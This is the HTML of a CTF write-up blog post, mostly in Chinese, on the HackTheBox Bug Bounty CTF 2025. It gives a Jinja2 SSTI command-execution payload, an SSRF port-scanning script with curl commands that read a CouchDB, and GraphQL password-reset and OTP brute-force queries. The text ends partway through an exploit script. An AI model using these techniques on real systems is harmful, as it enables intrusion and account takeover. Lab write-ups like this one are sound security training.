@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before allsolo&#x2F;AK（破台）, Rank 31&#x2F;1301   之前在 CTFTime 上看到這場冠軍獎品居然是 CBBH 證照，忍不住就想衝一把 結果就記錯時間了，題目太簡單自然早就有冠軍了，後面就拿牛肉湯的帳號登入一下 solo 一把 XD   這場的題目模式比較有趣，都是黑箱，但又怕太通靈（？）所以都會提一下這題可能需要的技術點，感覺還行但還是要多做點 enu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox Bug Bounty CTF 2025 Write Up">
+<meta property="og:url" content="http://wha13.github.io/2025/06/30/2025-bugbountyctf/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before allsolo&#x2F;AK（破台）, Rank 31&#x2F;1301   之前在 CTFTime 上看到這場冠軍獎品居然是 CBBH 證照，忍不住就想衝一把 結果就記錯時間了，題目太簡單自然早就有冠軍了，後面就拿牛肉湯的帳號登入一下 solo 一把 XD   這場的題目模式比較有趣，都是黑箱，但又怕太通靈（？）所以都會提一下這題可能需要的技術點，感覺還行但還是要多做點 enu">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1R5GCR4xx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryHuGCRVle.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkxhzRRNxl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hk0I40RVge.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJyo4CRNgx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJlXIAANll.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJdYLAA4gx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1MsLA0Egl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryqnURREee.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJXoOAAEgl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJ3LsC0Egl.png">
+<meta property="article:published_time" content="2025-06-30T15:51:20.000Z">
+<meta property="article:modified_time" content="2025-06-29T15:30:36.493Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="prototype pollution">
+<meta property="article:tag" content="GraphQL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/B1R5GCR4xx.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox Bug Bounty CTF 2025 Write Up</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/06/19/2025-smiley-ctf/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/06/30/2025-bugbountyctf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&text=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&title=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&is_video=false&description=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox Bug Bounty CTF 2025 Write Up&body=Check out this article: http://wha13.github.io/2025/06/30/2025-bugbountyctf/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&title=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&title=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&title=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&title=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&name=HackTheBox Bug Bounty CTF 2025 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/06/30/2025-bugbountyctf/&t=HackTheBox Bug Bounty CTF 2025 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writeup"><span class="toc-number">2.</span> <span class="toc-text">Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JinjaCare"><span class="toc-number">2.1.</span> <span class="toc-text">JinjaCare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NeoVault"><span class="toc-number">2.2.</span> <span class="toc-text">NeoVault</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CitiSmart"><span class="toc-number">2.3.</span> <span class="toc-text">CitiSmart</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SpeedNet"><span class="toc-number">2.4.</span> <span class="toc-text">SpeedNet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sattrack"><span class="toc-number">2.5.</span> <span class="toc-text">Sattrack</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox Bug Bounty CTF 2025 Write Up
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-30T15:51:20.000Z" class="dt-published" itemprop="datePublished">2025-06-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/GraphQL/" rel="tag">GraphQL</a>, <a class="p-category" href="/tags/HackTheBox/" rel="tag">HackTheBox</a>, <a class="p-category" href="/tags/XSS/" rel="tag">XSS</a>, <a class="p-category" href="/tags/prototype-pollution/" rel="tag">prototype pollution</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>solo&#x2F;AK（破台）, Rank 31&#x2F;1301  </p>
+<p>之前在 CTFTime 上看到這場冠軍獎品居然是 CBBH 證照，忍不住就想衝一把 <del>結果就記錯時間了，題目太簡單自然早就有冠軍了</del>，後面就拿牛肉湯的帳號登入一下 solo 一把 XD  </p>
+<p>這場的題目模式比較有趣，都是黑箱，但又怕太通靈（？）所以都會提一下這題可能需要的技術點，感覺還行但還是要多做點 enumeration 跟觀察，整體題目難度體感大概 3&#x2F;10，<del>但好少一次看那麼多 Next.js 搞出來的網站有點累</del>  </p>
+<p>還是紀錄幾個關鍵字：  </p>
+<ul>
+<li>Prototype Pollution</li>
+<li>JSON Escape</li>
+<li>Alias-based Query Batching</li>
+<li>CouchDB</li>
+<li>Mongo Object ID Prediction</li>
+</ul>
+<p>最後一個關鍵自很有趣，簡單來說 Mongo DB 生成的 Object ID 會是當前時間 + (理論上同一個 db 都一樣的) Process ID 和 db 編號 + 流水號，可預測 XD （但給這個 Hint 的題目完全不需要使用這個 feature）  </p>
+<h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><p>按照官方難度排？  </p>
+<h3 id="JinjaCare"><a href="#JinjaCare" class="headerlink" title="JinjaCare"></a>JinjaCare</h3><ul>
+<li>SSTI</li>
+</ul>
+<p>沒什麼好講，看到題目名稱就是 Jinja2 SSTI，一開始註冊 username 只可以是英文和空格，但登入後改名不受限，改叫 <code>&#123;&#123;7*7&#125;&#125;</code> 再下載自己的接踵紀錄 pdf 就確認觸發點了  </p>
+<p><img src="https://hackmd.io/_uploads/B1R5GCR4xx.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/ryHuGCRVle.png" alt="image">  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; self.__init__.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/SkxhzRRNxl.png" alt="image">  </p>
+<h3 id="NeoVault"><a href="#NeoVault" class="headerlink" title="NeoVault"></a>NeoVault</h3><p>一個線上轉帳程式，會發現下載轉帳資訊的 api 由本來驗證 JWT 的 v2 改成 v1 後會要求提供 <code>_id</code> 的 userid 資訊  </p>
+<p><img src="https://hackmd.io/_uploads/Hk0I40RVge.png" alt="image">  </p>
+<p>又因為取得轉帳資訊的時候會拿到 neo_system 的 userid，就可以下載 neo_system 交易紀錄並發現存在 <code>user_with_flag</code>，再次透過  </p>
+<p><code>/api/v2/auth/inqure</code> API 獲得 userid，最後再下載一次他的交易紀錄就取得 flag 了  </p>
+<p><img src="https://hackmd.io/_uploads/rJyo4CRNgx.png" alt="image"></p>
+<h3 id="CitiSmart"><a href="#CitiSmart" class="headerlink" title="CitiSmart"></a>CitiSmart</h3><p>爬一下網站的 JS，會找到 endpoints <code>/api/dashboard/endpoints/</code> 和 <code>/api/dashboard/metrics</code>，並且他們不用驗證就能存取（只要有 token cookie 就行）  </p>
+<p><img src="https://hackmd.io/_uploads/HJlXIAANll.png" alt="image"></p>
+<p>會發現好像都是做一些請求用的  </p>
+<p><img src="https://hackmd.io/_uploads/SJdYLAA4gx.png" alt="image">  </p>
+<p>然後可以自己塞 url 進去要他請求  </p>
+<p><img src="https://hackmd.io/_uploads/H1MsLA0Egl.png" alt="image"></p>
+<p>但是看 WebHook 發現是 &#x2F;metrics 被請求，問題不大，塞個 <code>#</code> 進去就能 bypass 了 XD  </p>
+<p><img src="https://hackmd.io/_uploads/ryqnURREee.png" alt="image"></p>
+<p><code>/api/dashboard/metrics</code> endpoint 是讀取結果。  </p>
+<p>拿到 SSRF 後先做 port scan  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">api_url = <span class="string">&#x27;http://94.237.50.221:39660/api/dashboard/endpoints/&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;token=fucku&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">target_ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">ports = <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65536</span>)</span><br><span class="line">thread_count = <span class="number">100</span></span><br><span class="line"></span><br><span class="line">open_ports = []</span><br><span class="line"></span><br><span class="line">q = Queue()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">        port = q.get()</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;url&quot;</span>: <span class="string">f&quot;http://<span class="subst">&#123;target_ip&#125;</span>:<span class="subst">&#123;port&#125;</span>/&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sector&quot;</span>: <span class="string">f&quot;whale_port_scan<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(api_url, headers=headers, data=json.dumps(payload), timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ECONNREFUSED&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Open port found: <span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">                open_ports.append(port)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        q.task_done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">    q.put(port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tqdm(total=<span class="built_in">len</span>(ports)) <span class="keyword">as</span> pbar:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapped_scan</span>():</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">            scan()</span><br><span class="line">            pbar.update(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(thread_count):</span><br><span class="line">        t = threading.Thread(target=wrapped_scan)</span><br><span class="line">        t.daemon = <span class="literal">True</span></span><br><span class="line">        t.start()</span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nOpen ports:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> open_ports:</span><br><span class="line">    <span class="built_in">print</span>(port)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Open port found: 80</span><br><span class="line">[+] Open port found: 3000</span><br><span class="line">[+] Open port found: 4369</span><br><span class="line">[+] Open port found: 5984</span><br><span class="line">[+] Open port found: 5986</span><br></pre></td></tr></table></figure>
+<p>戳一下發現 5984 是 couch db  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#確認是 couchdb</span></span><br><span class="line">curl -X POST <span class="string">&#x27;http://94.237.50.221:39660/api/dashboard/endpoints/&#x27;</span> -H <span class="string">&#x27;Cookie: token=whale&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="string">&quot;&#123;\&quot;url\&quot;:\&quot;http://127.0.0.1:5984/#\&quot;,\&quot;sector\&quot;:\&quot;whale_get_4369\&quot;&#125;&quot;</span></span><br><span class="line">curl -X GET <span class="string">&#x27;http://94.237.50.221:39660/api/dashboard/metrics&#x27;</span> -H <span class="string">&#x27;Cookie: token=whale&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取得所有 dbs</span></span><br><span class="line">curl -X POST <span class="string">&#x27;http://94.237.50.221:39660/api/dashboard/endpoints/&#x27;</span> -H <span class="string">&#x27;Cookie: token=whale&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="string">&quot;&#123;\&quot;url\&quot;:\&quot;http://127.0.0.1:5984/_all_dbs#\&quot;,\&quot;sector\&quot;:\&quot;whale_get_5984_all_dbs\&quot;&#125;&quot;</span></span><br><span class="line">curl -X GET <span class="string">&#x27;http://94.237.50.221:39660/api/dashboard/metrics&#x27;</span> -H <span class="string">&#x27;Cookie: token=whale&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 確認 citismart 可請求，取得 docs 並讀取 flag</span></span><br><span class="line">curl -X POST <span class="string">&#x27;http://94.237.50.221:39660/api/dashboard/endpoints/&#x27;</span> -H <span class="string">&#x27;Cookie: token=whale&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="string">&quot;&#123;\&quot;url\&quot;:\&quot;http://127.0.0.1:5984/citismart#\&quot;,\&quot;sector\&quot;:\&quot;whale_get_5984_citismart\&quot;&#125;&quot;</span></span><br><span class="line">curl -X GET <span class="string">&#x27;http://94.237.50.221:39660/api/dashboard/metrics&#x27;</span> -H <span class="string">&#x27;Cookie: token=whale&#x27;</span></span><br><span class="line">curl -X POST <span class="string">&#x27;http://94.237.50.221:39660/api/dashboard/endpoints/&#x27;</span> -H <span class="string">&#x27;Cookie: token=whale&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="string">&quot;&#123;\&quot;url\&quot;:\&quot;http://127.0.0.1:5984/citismart/_all_docs#\&quot;,\&quot;sector\&quot;:\&quot;whale_get_5984_citismart_all_docs\&quot;&#125;&quot;</span> </span><br><span class="line">curl -X GET <span class="string">&#x27;http://94.237.50.221:39660/api/dashboard/metrics&#x27;</span> -H <span class="string">&#x27;Cookie: token=whale&#x27;</span></span><br><span class="line">curl -X POST <span class="string">&#x27;http://94.237.50.221:39660/api/dashboard/endpoints/&#x27;</span> -H <span class="string">&#x27;Cookie: token=whale&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="string">&quot;&#123;\&quot;url\&quot;:\&quot;http://127.0.0.1:5984/citismart/FLAG#\&quot;,\&quot;sector\&quot;:\&quot;whale_get_5984_citismart_FLAG\&quot;&#125;&quot;</span> </span><br><span class="line">curl -X GET <span class="string">&#x27;http://94.237.50.221:39660/api/dashboard/metrics&#x27;</span> -H <span class="string">&#x27;Cookie: token=whale&#x27;</span> | grep FLAG</span><br></pre></td></tr></table></figure>
+
+<h3 id="SpeedNet"><a href="#SpeedNet" class="headerlink" title="SpeedNet"></a>SpeedNet</h3><p>自產自銷，如果我有幸讓人看到這篇，不會 graphql 可以來快速看 <a target="_blank" rel="noopener" href="https://blog.whale-tw.com/2024/08/11/hacker101ctf-bugdb/">https://blog.whale-tw.com/2024/08/11/hacker101ctf-bugdb/</a>  </p>
+<p>經典的 GraphQL API 外漏<br>做 Introspection 取得所有 api 請求方法<br>可以先 query userid&#x3D;1 取得 admin email  </p>
+<p>devForgotPassword 可以獲得任意 email 重設 token 並不用去 mail 翻  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mutation($email: String!) &#123;</span><br><span class="line">  devForgotPassword(email: $email)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下來就可以用 token 打 resetPassword 的 mutation 把 admin 密碼設定掉，但 admin 預設開啟 OTP 2FA，會寄給 mail  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mutation($token: String!, $newPassword: String!) &#123;</span><br><span class="line">  resetPassword(token: $token, newPassword: $newPassword)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>登入後會收到這樣的 token，要去請求 verifyOTP 並驗證成功才能拿 登入 token<br><img src="https://hackmd.io/_uploads/SJXoOAAEgl.png" alt="image"></p>
+<p>每次有效五分鐘，有做流量限制，爆破爆破不完  </p>
+<p>派出 Graph QL Alias-based Query Batching<br>可以構造這樣的 query 大量驗證 OTP  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mutation &#123;</span><br><span class="line">  trial0000: verifyTwoFactor(token: &quot;&#123;token&#125;&quot;, otp: &quot;0000&quot;)&#123;token&#125;</span><br><span class="line">  trial0001: verifyTwoFactor(token: &quot;&#123;token&#125;&quot;, otp: &quot;0001&quot;)&#123;token&#125;</span><br><span class="line">  trial0002: verifyTwoFactor(token: &quot;&#123;token&#125;&quot;, otp: &quot;0002&quot;)&#123;token&#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但因為一次送完太大，我拆成一百一百個一組  </p>
+<p>Final Exploit，admin 密碼被我換成 whale120 了<br><strong>Generated by ChatGPT</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----- 配置區 -----</span></span><br><span class="line">GRAPHQL_URL = <span class="string">&quot;http://94.237.58.201:32592/graphql&quot;</span></span><br><span class="line"><span class="comment"># 請將下面這個 TOKEN 換成你實際拿到的最新值</span></span><br><span class="line">AUTH_TOKEN = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjMsImlhdCI6MTc1MTEyNTcxNywiZXhwIjoxNzUxMTI5MzE3fQ.p77Om4yL_Jq8si4nCrFEnMzebQfU6uGeFYwhFzBO07Q&quot;</span></span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;94.237.58.201:32592&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>: AUTH_TOKEN,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-TW,zh;q=0.9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span 